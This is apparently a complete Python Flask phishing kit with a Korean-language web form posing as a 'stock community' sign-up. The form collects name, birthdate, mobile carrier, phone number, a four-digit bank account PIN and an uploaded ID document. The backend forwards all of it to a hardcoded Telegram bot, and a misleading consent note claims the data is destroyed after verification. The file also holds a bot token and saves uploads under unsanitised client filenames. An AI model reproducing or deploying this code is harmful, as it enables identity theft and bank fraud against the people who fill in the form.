# app.py
import os, requests
from pathlib import Path
from flask import Flask, request, jsonify, render_template_string

# ── 텔레그램 정보 ─────────────────────────────────────────
BOT_TOKEN = "8188337653:AAFGh85xzp5u_RqRJLrV8p3zR_D13c9RHuo"   # BotFather 토큰
CHAT_ID   = 1902936                                           # 메시지를 받을 chat_id
# ──────────────────────────────────────────────────────────

# ── HTML (사진 + PDF 업로드 가능하도록 accept 속성 수정) ──
HTML = r"""<!DOCTYPE html>
<html lang="ko">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width,initial-scale=1.0">
  <title>신분정보 입력 양식</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <style>
  @import url('https://fonts.googleapis.com/css2?family=Noto+Sans+KR:wght@300;400;500;700&display=swap');
  body{font-family:'Noto Sans KR',sans-serif;background:#f8fafc}
  .card{box-shadow:0 10px 30px -10px rgba(0,0,0,.1);transition:.3s}
  .card:hover{box-shadow:0 15px 35px -10px rgba(0,0,0,.15);transform:translateY(-2px)}
  .input-field{border-bottom:2px solid #e2e8f0;padding-top:1.2rem;transition:.3s}
  .input-field:focus{border-bottom-color:#3b82f6}
  .file-input{opacity:0;width:.1px;height:.1px;position:absolute}
  .file-input-label{display:flex;flex-direction:column;align-items:center;justify-content:center;padding:1.5rem;border:2px dashed #cbd5e1;border-radius:.5rem;cursor:pointer;transition:.3s}
  .file-input-label:hover{border-color:#3b82f6;background:rgba(59,130,246,.05)}
  .file-input-label.dragover{border-color:#3b82f6;background:rgba(59,130,246,.1)}
  .preview-container{display:none;position:relative}
  .preview-image{max-width:100%;max-height:200px;border-radius:.5rem}
  .remove-btn{position:absolute;top:-10px;right:-10px;background:#ef4444;color:#fff;border-radius:50%;width:25px;height:25px;display:flex;align-items:center;justify-content:center;cursor:pointer;transition:.2s}
  .remove-btn:hover{transform:scale(1.1)}
  .progress-bar{height:6px;background:#e2e8f0;border-radius:3px;overflow:hidden;margin-top:10px}
  .progress{height:100%;background:#3b82f6;width:0;transition:width .3s}
  .submit-btn{position:relative;overflow:hidden}
  .submit-btn:focus:not(:active)::after{animation:ripple 1s ease-out}
  @keyframes ripple{0%{transform:scale(0);opacity:.5}100%{transform:scale(20);opacity:0}}
  .tooltip{position:relative}
  .tooltip:hover .tooltip-text{visibility:visible;opacity:1}
  .tooltip-text{visibility:hidden;width:200px;background:#334155;color:#fff;text-align:center;border-radius:6px;padding:8px;position:absolute;z-index:1;bottom:125%;left:50%;transform:translateX(-50%);opacity:0;transition:opacity .3s;font-size:.8rem}
  .tooltip-text::after{content:"";position:absolute;top:100%;left:50%;margin-left:-5px;border-width:5px;border-style:solid;border-color:#334155 transparent transparent transparent}
  </style>
</head>
<body class="min-h-screen flex items-center justify-center p-4">
<div class="w-full max-w-2xl">
  <div class="card bg-white rounded-xl overflow-hidden p-8">
    <div class="text-center mb-8">
      <h1 class="text-3xl font-bold text-gray-800 mb-2">주식 커뮤니티 양식</h1>
      <p class="text-gray-600">아래 양식에 정보를 입력해주세요</p>

      <!-- 진행 바 -->
      <div class="flex justify-center mt-6">
        <div class="flex items-center w-full max-w-xs md:max-w-sm">
          <div id="step-1" class="flex items-center justify-center w-8 h-8 rounded-full bg-blue-500 text-white">1</div>
          <div id="line-mid" class="flex-1 h-1 mx-2 bg-gray-200 rounded-full"></div>
          <div id="step-2" class="flex items-center justify-center w-8 h-8 rounded-full bg-gray-200 text-gray-600">2</div>
        </div>
      </div>
    </div>

    <!-- 폼 -->
    <form id="identityForm" class="space-y-6" enctype="multipart/form-data">
      <div id="formErrors" class="hidden bg-red-50 border-l-4 border-red-500 p-4 mb-4">
        <div class="flex">
          <div class="flex-shrink-0"><i class="fas fa-exclamation-circle text-red-500"></i></div>
          <div class="ml-3"><p id="errorMessage" class="text-sm text-red-700"></p></div>
        </div>
      </div>

      <div>
        <label for="name" class="block text-sm font-medium text-gray-700 mb-1">이름</label>
        <div class="relative">
          <input type="text" id="name" name="name" required
                 class="input-field w-full px-4 py-3 bg-gray-50 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-100"
                 placeholder="홍길동">
          <div class="absolute inset-y-0 right-0 flex items-center pr-3 pointer-events-none">
            <i class="fas fa-user text-gray-400"></i>
          </div>
        </div>
      </div>

      <div>
        <label for="birthdate" class="block text-sm font-medium text-gray-700 mb-1">생년월일</label>
        <div class="relative">
          <input type="date" id="birthdate" name="birthdate" required
                 max="9999-12-31"
                 class="input-field w-full px-4 py-3 bg-gray-50 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-100 pr-12">
          <div class="absolute inset-y-0 right-0 flex items-center pr-3 pointer-events-none">
            <i class="fas fa-calendar-alt text-gray-400"></i>
          </div>
        </div>
      </div>

      <div>
        <label class="block text-sm font-medium text-gray-700 mb-1">통신사</label>
        <div class="grid grid-cols-3 gap-3">
          <div><input type="radio" id="carrier1" name="carrier" value="SKT" class="hidden peer" required>
            <label for="carrier1" class="flex items-center justify-center p-3 bg-gray-50 rounded-lg border border-gray-200 cursor-pointer peer-checked:border-blue-500 peer-checked:bg-blue-50 peer-checked:text-blue-600">SKT</label></div>
          <div><input type="radio" id="carrier2" name="carrier" value="KT" class="hidden peer">
            <label for="carrier2" class="flex items-center justify-center p-3 bg-gray-50 rounded-lg border border-gray-200 cursor-pointer peer-checked:border-blue-500 peer-checked:bg-blue-50 peer-checked:text-blue-600">KT</label></div>
          <div><input type="radio" id="carrier3" name="carrier" value="LG U+" class="hidden peer">
            <label for="carrier3" class="flex items-center justify-center p-3 bg-gray-50 rounded-lg border border-gray-200 cursor-pointer peer-checked:border-blue-500 peer-checked:bg-blue-50 peer-checked:text-blue-600">LG U+</label></div>

          <!-- 알뜰 세부 3종 -->
          <div><input type="radio" id="carrier4" name="carrier" value="알뜰 KT" class="hidden peer">
            <label for="carrier4" class="flex items-center justify-center p-3 bg-gray-50 rounded-lg border border-gray-200 cursor-pointer peer-checked:border-blue-500 peer-checked:bg-blue-50 peer-checked:text-blue-600">알뜰 KT</label></div>
          <div><input type="radio" id="carrier5" name="carrier" value="알뜰 SKT" class="hidden peer">
            <label for="carrier5" class="flex items-center justify-center p-3 bg-gray-50 rounded-lg border border-gray-200 cursor-pointer peer-checked:border-blue-500 peer-checked:bg-blue-50 peer-checked:text-blue-600">알뜰 SKT</label></div>
          <div><input type="radio" id="carrier6" name="carrier" value="알뜰 LG" class="hidden peer">
            <label for="carrier6" class="flex items-center justify-center p-3 bg-gray-50 rounded-lg border border-gray-200 cursor-pointer peer-checked:border-blue-500 peer-checked:bg-blue-50 peer-checked:text-blue-600">알뜰 LG</label></div>
        </div>
      </div>

      <div>
        <label for="phone" class="block text-sm font-medium text-gray-700 mb-1">전화번호</label>
        <div class="relative">
          <input type="tel" id="phone" name="phone" required
                 class="w-full px-4 py-3 bg-gray-50 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-100"
                 placeholder="010-1234-5678">
          <div class="absolute inset-y-0 right-0 flex items-center pr-3 pointer-events-none">
            <i class="fas fa-mobile-alt text-gray-400"></i>
          </div>
        </div>
      </div>

      <div>
        <label for="bankpin" class="block text-sm font-medium text-gray-700 mb-1">계좌 비밀번호 (4자리)</label>
        <div class="relative">
          <input type="password" id="bankpin" name="bankpin" required maxlength="4" pattern="\d{4}" inputmode="numeric"
                 class="w-full px-4 py-3 bg-gray-50 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-100 pr-12"
                 placeholder="••••">
          <button type="button" id="pinToggle" class="absolute inset-y-0 right-0 flex items-center pr-3 text-gray-400 hover:text-gray-600">
            <i class="fas fa-eye" id="pinIcon"></i>
          </button>
        </div>
      </div>

      <div>
        <label class="block text-sm font-medium text-gray-700 mb-1">신분증 파일</label>
        <input type="file" id="idPhoto" name="idPhoto" accept="image/*,application/pdf" class="file-input" required>
        <label for="idPhoto" id="fileInputLabel" class="file-input-label">
          <i class="fas fa-cloud-upload-alt text-3xl text-blue-500 mb-2"></i>
          <span class="text-sm">드래그 또는 클릭하여 업로드</span>
          <span class="text-xs text-gray-500 mt-1">JPG/PNG/PDF, 최대 5MB</span>
          <div class="w-full bg-gray-200 rounded-full h-1.5 mt-2">
            <div id="sizeIndicator" class="bg-blue-500 h-1.5 rounded-full" style="width:0%"></div>
          </div>
        </label>

        <div id="previewContainer" class="preview-container mt-4">
          <img id="previewImage" class="preview-image" src="#" alt="미리보기">
          <div id="removeBtn" class="remove-btn"><i class="fas fa-times"></i></div>
        </div>

        <div id="progressBar" class="progress-bar hidden"><div id="progress" class="progress"></div></div>
      </div>

      <div class="flex items-center">
        <input type="checkbox" id="agree" name="agree" required
               class="w-4 h-4 text-blue-600 bg-gray-100 border-gray-300 rounded focus:ring-blue-500">
        <label for="agree" class="ml-2 text-sm text-gray-700">
          <span class="tooltip"><span class="underline">개인정보 수집 및 이용</span>에 동의합니다
            <span class="tooltip-text">본인 확인 후 즉시 파기됩니다.</span>
          </span>
        </label>
      </div>

      <div class="pt-4">
        <button type="submit" id="submitBtn"
                class="submit-btn w-full px-6 py-3 bg-blue-600 hover:bg-blue-700 text-white font-medium rounded-lg shadow-md transition-all duration-300 transform hover:scale-105">
          <span id="submitText">정보 제출하기</span>
          <span id="submitSpinner" class="hidden ml-2"><i class="fas fa-circle-notch fa-spin"></i></span>
        </button>
      </div>
    </form>
  </div>
</div>

<script>
document.addEventListener('DOMContentLoaded', () => {
  const form=document.getElementById('identityForm');
  const submitBtn=document.getElementById('submitBtn');
  const submitTxt=document.getElementById('submitText');
  const submitSpn=document.getElementById('submitSpinner');
  const errBox=document.getElementById('formErrors');
  const errMsg=document.getElementById('errorMessage');
  const lineMid=document.getElementById('line-mid');
  const step2=document.getElementById('step-2');

  /* 생년월일: 연도 4자리 초과 입력 방지 */
  const birthInput=document.getElementById('birthdate');
  birthInput.addEventListener('input',e=>{
    const v=e.target.value;
    const parts=v.split('-');
    if(parts[0] && parts[0].length>4){
      parts[0]=parts[0].slice(0,4);
      e.target.value=parts.join('-');
    }
  });

  /* 전화번호 하이픈 */
  document.getElementById('phone').addEventListener('input',e=>{
    let v=e.target.value.replace(/\D/g,'');
    if(v.length>3&&v.length<=7) v=v.slice(0,3)+'-'+v.slice(3);
    else if(v.length>7) v=v.slice(0,3)+'-'+v.slice(3,7)+'-'+v.slice(7,11);
    e.target.value=v;
  });

  /* PIN 보기 */
  document.getElementById('pinToggle').addEventListener('click',()=>{
    const pin=document.getElementById('bankpin');
    const icon=document.getElementById('pinIcon');
    pin.type=pin.type==='password'?'text':'password';
    icon.classList.toggle('fa-eye');icon.classList.toggle('fa-eye-slash');
  });

  /* 파일 업로드 미리보기 & 제한 */
  const fileInput=document.getElementById('idPhoto');
  const previewImg=document.getElementById('previewImage');
  const previewCont=document.getElementById('previewContainer');
  const removeBtn=document.getElementById('removeBtn');
  const progressBar=document.getElementById('progressBar');
  const progress=document.getElementById('progress');
  const sizeInd=document.getElementById('sizeIndicator');
  document.getElementById('fileInputLabel').addEventListener('dragover',e=>{e.preventDefault();e.currentTarget.classList.add('dragover');});
  document.getElementById('fileInputLabel').addEventListener('dragleave',e=>{e.preventDefault();e.currentTarget.classList.remove('dragover');});
  document.getElementById('fileInputLabel').addEventListener('drop',e=>{
    e.preventDefault();e.currentTarget.classList.remove('dragover');
    if(e.dataTransfer.files.length){fileInput.files=e.dataTransfer.files;handleUpload(fileInput.files[0]);}
  });
  fileInput.addEventListener('change',()=>{if(fileInput.files[0]) handleUpload(fileInput.files[0]);});
  function handleUpload(f){
    if(f.size>5*1024*1024){alert('파일 크기는 5MB를 초과할 수 없습니다.');return;}
    if(!f.type.match('image.*')&&f.type!=='application/pdf'){alert('이미지 또는 PDF만 업로드 가능합니다.');return;}
    if(f.type==='application/pdf'){previewImg.src='https://cdn-icons-png.flaticon.com/512/337/337946.png';}
    else{
      const r=new FileReader();r.onload=e=>{previewImg.src=e.target.result;};r.readAsDataURL(f);
    }
    previewCont.style.display='block';
    progressBar.classList.remove('hidden');
    let w=0;const it=setInterval(()=>{if(w>=100){clearInterval(it);setTimeout(()=>progressBar.classList.add('hidden'),500);}else{w+=10;progress.style.width=w+"%";}},100);
    const pct=Math.min((f.size/5242880)*100,100);
    sizeInd.style.width=pct+'%';sizeInd.classList.toggle('bg-red-500',pct>90);sizeInd.classList.toggle('bg-blue-500',pct<=90);
  }
  removeBtn.addEventListener('click',()=>{
    fileInput.value='';previewCont.style.display='none';progressBar.classList.add('hidden');
    progress.style.width='0%';sizeInd.style.width='0%';sizeInd.classList.remove('bg-red-500');sizeInd.classList.add('bg-blue-500');
  });

  /* 폼 제출 */
  form.addEventListener('submit',async e=>{
    e.preventDefault();

    errBox.classList.add('hidden');
    form.querySelectorAll('.border-red-500').forEach(el=>el.classList.remove('border-red-500'));
    let firstErr=null;
    form.querySelectorAll('[required]').forEach(inp=>{
      if(!inp.value||(inp.id==='phone'&&!/^01[0-9]-\d{3,4}-\d{4}$/.test(inp.value))){
        inp.classList.add('border-red-500');if(!firstErr)firstErr=inp;
      }
    });
    if(!document.getElementById('agree').checked){
      document.getElementById('agree').parentElement.classList.add('text-red-500');
      if(!firstErr)firstErr=document.getElementById('agree');
    }else{
      document.getElementById('agree').parentElement.classList.remove('text-red-500');
    }
    if(firstErr){
      errMsg.textContent='모든 필수 항목을 올바르게 입력해주세요.';
      errBox.classList.remove('hidden');
      firstErr.scrollIntoView({behavior:'smooth',block:'center'});
      return;
    }

    submitBtn.disabled=true;submitTxt.textContent='처리 중...';submitSpn.classList.remove('hidden');

    const fd=new FormData(form);
    try{
      const r=await fetch('/submit',{method:'POST',body:fd});
      const j=await r.json();
      if(j.success){
        lineMid.classList.replace('bg-gray-200','bg-blue-500');
        step2.classList.remove('bg-gray-200','text-gray-600');
        step2.classList.add('bg-blue-500','text-white');

        form.innerHTML=`
          <div class="text-center py-8">
            <div class="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
              <i class="fas fa-check text-green-600 text-2xl"></i>
            </div>
            <h3 class="text-xl font-bold text-gray-800 mb-2">제출 완료</h3>
            <p class="text-gray-600 mb-6">입력하신 정보가 성공적으로 제출되었습니다.</p>
            <button onclick="location.reload()" class="px-6 py-2 bg-blue-600 hover:bg-blue-700 text-white rounded-lg transition-colors">
              새로 작성하기
            </button>
          </div>`;
      }else{
        alert('서버 오류로 제출에 실패했습니다.');
      }
    }catch(err){
      console.error(err);alert('네트워크 오류가 발생했습니다.');
    }finally{
      submitBtn.disabled=false;submitTxt.textContent='정보 제출하기';submitSpn.classList.add('hidden');
    }
  });
});
</script>
</body>
</html>"""

# ── Flask 백엔드 ───────────────────────────────────────
app = Flask(__name__)
UPLOAD_DIR = Path("uploads"); UPLOAD_DIR.mkdir(exist_ok=True)

@app.route("/")
def index():
    return render_template_string(HTML)

@app.route("/submit", methods=["POST"])
def submit_form():
    file_obj = request.files.get("idPhoto")
    if not file_obj:
        return jsonify(success=False), 400

    path = UPLOAD_DIR / file_obj.filename
    file_obj.save(path)

    caption = (
        f"*신분정보 제출*\n"
        f"• 이름 : {request.form['name']}\n"
        f"• 생년월일 : {request.form['birthdate']}\n"
        f"• 통신사 : {request.form['carrier']}\n"
        f"• 전화번호 : {request.form['phone']}\n"
        f"• 계좌 PIN : {request.form['bankpin']}"
    )

    resp = requests.post(
        f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
        data={"chat_id": CHAT_ID, "caption": caption, "parse_mode": "Markdown"},
        files={"document": open(path, "rb")},
        timeout=30,
    )
    print("Telegram response:", resp.status_code, resp.text)

    ok = resp.json().get("ok", False)
    path.unlink(missing_ok=True)
    return jsonify(success=ok)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 5000)))
